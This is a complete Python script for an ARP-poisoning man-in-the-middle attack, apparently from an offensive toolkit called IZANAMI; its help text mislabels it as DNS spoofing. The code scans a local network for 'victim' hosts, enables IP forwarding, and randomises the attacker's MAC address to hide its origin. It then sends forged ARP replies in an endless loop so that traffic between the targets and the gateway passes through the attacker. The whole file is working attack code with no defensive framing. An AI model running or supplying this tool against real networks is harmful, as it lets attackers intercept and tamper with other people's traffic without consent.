#!/usr/bin/env python3
try:
    import os
    from scapy.all import Ether, ARP, srp, send, get_if_hwaddr
    import argparse
    import time
    import sys
    import re
    import random
    import ipaddress
    import socket
    from core.colors import *
    from pwn import log
    from subprocess import call
    import fcntl, struct
    import nmap as nm
    import concurrent.futures
except ImportError as err:
    exit(err)


def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def enable_ip_route(p, verbose=True):
    """
    Enables IP forwarding
    """
    _enable_linux_iproute()
    if verbose:
        p.success("enabled.")


def read_conf(data):
    all_data = []
    for line_ in data:
        line_ = line_.rstrip('\n')
        _ = re.split(r'\t+', line_.rstrip('\t'))
        all_data.append(list(_))
    return all_data


def find_vendor(v, fdata):
    rdata = ""
    for i in fdata:
        if v == i[0]:
            rdata = i[1]
    return rdata


def call_change_mac(iface, mac):
    call(['ifconfig', iface, 'down'])
    call(['ifconfig', iface, 'hw', 'ether', mac])
    call(['ifconfig', iface, 'up'])


def change_mac(iface, p, mac=None):
    """
    change the interfae mac address
    """
    if mac != None:
        call_change_mac(iface, mac)
        p.success("Restored.")
    else:
        fdata = read_conf(
            data=open("core/mac-vendor.txt", mode="r").readlines())
        first_6 = random.choice(fdata)
        vendor = find_vendor(first_6[0], fdata)
        if vendor == "":
            vendor = "Unknown Vendor"
        mac = ":".join(re.findall(r"\w{2}", first_6[0])) + ":00:00:00"
        time.sleep(1)
        p.success(
            f"Generated {YELLOW}→  {GREEN}{mac}{WHITE} ({GREEN}{vendor}{WHITE}){RESET}"
        )
        p = log.progress(
            f"Changing {WHITE}{iface}{RESET} mac address")
        time.sleep(1)
        call_change_mac(iface, mac)
        p.success("Changed.")


def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,
                       struct.pack('256s',
                                   bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])


def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),
                 timeout=3,
                 verbose=0)
    if ans:
        return ans[0][1].src


def getLocalIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    x = s.getsockname()[0]
    s.close()
    return x


def t():
    return f"{YELLOW}{time.ctime()}{RESET}"


def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip,
                       hwdst=target_mac,
                       psrc=host_ip,
                       op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        log.success(
            f"Sent to {WHITE}'{GREEN}{target_ip}{WHITE}' {YELLOW}→  {WHITE}'{GREEN}{host_ip}{WHITE}' {YELLOW}is-at {WHITE}'{GREEN}{self_mac}{WHITE}'{RESET}"
        )


def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip,
                       hwdst=target_mac,
                       psrc=host_ip,
                       hwsrc=host_mac)
    send(arp_response, verbose=0, count=7)
    if verbose:
        log.success(
            f"Sent to {WHITE}'{GREEN}{target_ip.rjust(8)}{WHITE}' {YELLOW}→  {WHITE}'{GREEN}{host_ip}{WHITE}' {YELLOW}is-at {WHITE}'{GREEN}{host_mac}{WHITE}'{RESET}"
        )


def scanUsingNmap(network, l: list = [], valid=[]):
    n = nm.PortScanner()
    sa = n.scan(hosts=network, arguments="-sn -T4")
    uphosts = sa['nmap']['scanstats']['uphosts']
    downhosts = sa['nmap']['scanstats']['downhosts']
    _ip, _mac, _vendor, _name = '', '', '', ''
    for key, value in sa['scan'].items():
        if str(value['status']['state']) == 'up':
            try:
                if getLocalIp() == value['addresses']['ipv4']:
                    _ip = value['addresses']['ipv4']
                    _mac = interface_mac
                    _vendor = _findVendor(_mac)
                    _name = value['hostnames'][0]['name'] if (
                        value['hostnames'][0]['name'] != '') else False
                else:
                    _ip = value['addresses']['ipv4']
                    _mac = value['addresses']['mac']
                    _vendor = value['vendor'][_mac]
                    _name = value['hostnames'][0]['name'] if (
                        value['hostnames'][0]['name'] != '') else False

                l.append([_ip, _mac, _vendor, _name])
                valid.append(_ip)
            except Exception as err:
                raise (err)
    return uphosts, downhosts, l, valid


def NmapConnectedDevices(network, p):
    List = []
    uph, dowh, List, _targets = scanUsingNmap(network, List)
    p.success("Scanned")
    return (uph, dowh, List, _targets)


def _findVendor(mac):
    fdata = read_conf(data=open("core/mac-vendor.txt", mode="r").readlines())
    nmac = str(mac[:8].replace(':', '')).upper()
    vendor = find_vendor(nmac, fdata)
    if vendor == "":
        vendor = "Unknown Vendor"
    return vendor


def _displayWithNmap(uph, dowh, List):
    log.success(
        f"{RESET}Total : {GREEN}{uph} up{WHITE}, {RED}{dowh} down{RESET}. "
    )
    blen = len([s for s in List if len(s) == len(max(List, key=len))][0])
    for _ip, _mac, _vendor, _name in List:
        if _name == False:
            _name = "Unknown Name"
        log.success(
            f"Found {RESET}({CYAN}{_name}{RESET}) {GREEN}{_ip}{WHITE} →  {GREEN}{_mac}{WHITE} ({GREEN}{_vendor}{WHITE}){RESET}"
        )


def exec_GetALLMAC(target, List, ips_list):
    xmac = get_mac(target)
    if ":" in str(xmac):
        List.append([target, xmac])
        ips_list.append(target)


def XGetConnectedDevices(targets, p):
    List, ips_list = [], []
    with concurrent.futures.ThreadPoolExecutor(
            max_workers=len(targets)) as executor:
        {
            executor.submit(exec_GetALLMAC, str(target), List, ips_list):
            target
            for target in targets
        }
    p.success("Scanned")
    return List, ips_list


def displayFounded(l):
    for addr, mac in l:
        vendor = _findVendor(mac)
        log.success(
            f"Found {GREEN}{addr}{WHITE} →  {GREEN}{mac}{WHITE} ({GREEN}{vendor}{WHITE}){RESET}"
        )


def XSpoofed(target, gateway):
    spoof(target, gateway)
    spoof(gateway, target)


def XRestored(target, gateway):
    restore(target, gateway)
    restore(gateway, target)

def print_help():
    print(f'\n\t{WHITE}DNS Spoofing Script {YELLOW}»»{WHITE} part of{BLINK}{BOLD} I Z A N A M I{RESET}{WHITE} Framework {YELLOW}»»{WHITE} by {BOLD}{CYAN}@{RED}YasserJanah{RESET} ({BOLD}{BLUE}fb/yasser.janah{RESET})\n')
    print('\n\033[1m\033[4mOptions\033[0m:')
    print(f'{WHITE}\t-t\t\t--targets\t\tVictim IP Address {RED}OR{RESET}{WHITE} Specify the Whole Network.')
    print(f'{WHITE}\t-g\t\t--gateway\t\tThe host you wish to intercept packets for (Usually the Gateway).')
    print(f'{WHITE}\t-a\t\t--arp\t\t    Scan Network With ARP instead of nmap (default: nmap).')
    print(f'{WHITE}\t-i\t\t--interface\t  Specify an interface.\n')

def main():
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.print_help = print_help
    parser.add_argument("-t",
                        "--targets",
                        help="Victim IP Address to ARP poison",
                        required=True)
    parser.add_argument(
        "-g",
        "--gateway",
        help="the host you wish to intercept packets for (usually the gateway)",
        required=True)
    parser.add_argument("-i",
                        "--interface",
                        help="Specify an interface",
                        required=True)
    parser.add_argument("-a",
                        "--arp",
                        help="Scan With ARP instead of nmap scan",
                        action='store_true',
                        required=False)

    args = parser.parse_args()
    targets, gateway, iface, __arp = args.targets, args.gateway, args.interface, args.arp
    global interface_mac
    interface_mac = get_if_hwaddr(iface)
    log.info(f"Started at {t()}")
    if '/' in targets:
        if not __arp:
            p = log.progress(
                f"Scanning {CYAN}network{RESET} for {GREEN}connected{RESET} devices"
            )
            up, down, List, targets = NmapConnectedDevices(targets, p)
            _displayWithNmap(up, down, List)
        else:
            targets = ipaddress.IPv4Network(targets)
            targets = [str(target) for target in targets.hosts()]
            p = log.progress(
                f"Scanning {CYAN}network{RESET} for {GREEN}connected{RESET} devices"
            )
            d_v, targets = XGetConnectedDevices(targets, p)
            displayFounded(d_v)
    else:
        targets = targets.split(",")
    if gateway in targets:
        targets.remove(gateway)
    if getLocalIp() in targets:
        targets.remove(getLocalIp())
    if len(targets) == 0:
        log.failure(
            f'no {GREEN}clients{RESET} detected in this {WHITE}network.{RESET}'
        )
        log.warn(
            f'if you think this is an {YELLOW}error{RESET}, please specify your {GREEN}targets.{RESET}'
        )
        log.failure('exiting...')
        exit(0)
    p = log.progress("Enabling IP Routing")
    time.sleep(0.5)
    enable_ip_route(p)
    try:
        p = log.progress('Generating mac address')
        change_mac(iface, p)
        v_t = f'{RESET},{GREEN} '.join(targets)
        log.success(
            f"Starting {CYAN}attack{RESET} on {GREEN}{len(targets)}{RESET} valid targets → '{GREEN}{v_t}{RESET}'."
        )
        while True:
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=len(targets)) as executor:
                {
                    executor.submit(XSpoofed, str(target), gateway): target
                    for target in targets
                }
    except KeyboardInterrupt:
        log.warning(
            f"{RED}Detected{YELLOW} CTRL+C ! {RESET}restoring the network, please wait...\n"
        )
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=len(targets)) as executor:
            {
                executor.submit(XRestored, str(target), gateway): target
                for target in targets
            }
        p = log.progress(
            f"Restoring {WHITE}{iface} {GREEN}→  {WHITE}{interface_mac}{RESET} mac address"
        )
        change_mac(iface, p, mac=interface_mac)
    except OSError as err:
        change_mac(iface, p, mac=interface_mac)
        exit(log.failure(str(err)))


if __name__ == "__main__":
    if os.getuid() != 0:
        exit(
            log.failure(
                f'{RED}script must run with root privileges !{RESET}'
            ))
    try:
        main()
    except Exception as errf:
        raise errf#log.failure(RED + str(errf) + RESET)
    except KeyboardInterrupt:
        log.failure('Detected CTRL+C ! exiting...')
